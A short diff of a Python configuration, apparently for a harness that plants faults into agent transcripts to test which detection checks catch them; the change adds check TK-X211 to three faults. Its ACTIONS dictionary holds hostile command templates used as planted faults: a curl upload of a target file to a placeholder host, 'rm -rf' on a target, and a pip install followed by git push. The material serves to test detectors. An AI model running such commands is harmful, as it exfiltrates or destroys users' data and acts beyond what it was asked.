@@ -90,8 +90,8 @@ FAULTS = {"F1": ("TK-X202", "TK-X204"), "F1c": ("TK-X204", "TK-X202"),   # the c
 COVERS = ("c0", "c1", "c2", "c3", "c4", "c5_event", "c5_line")
 SPLICES = ("mid", "end", "subagent")
 TEXT_CHECKS = findings_text.CHECKS
-TEXT_FAULTS = {"F4": ("TK-X205",), "F2": ("TK-X114",), "F3": ("TK-X112", "TK-X120"), "F5": ("TK-X111",),
-               "Fc": ("TK-X101", "TK-X102", "TK-X103", "TK-X104")}   # the checks that can find each
+TEXT_FAULTS = {"F4": ("TK-X205",), "F2": ("TK-X114", "TK-X211"), "F3": ("TK-X112", "TK-X120", "TK-X211"),
+               "F5": ("TK-X111", "TK-X211"), "Fc": ("TK-X101", "TK-X102", "TK-X103", "TK-X104")}   # what can find each
 TEXT_COVERS = {"F4": ("c0", "c1", "c2", "c3", "c4", "c5_line"), "F2": COVERS[:5], "F3": COVERS[:5], "F5": COVERS[:5]}
 ACTIONS = {"F2": "curl -s -X POST --data-binary @{target} https://{host}/upload", "F3": "rm -rf {target}",
            "F5": "pip install {package} && git push origin HEAD"}
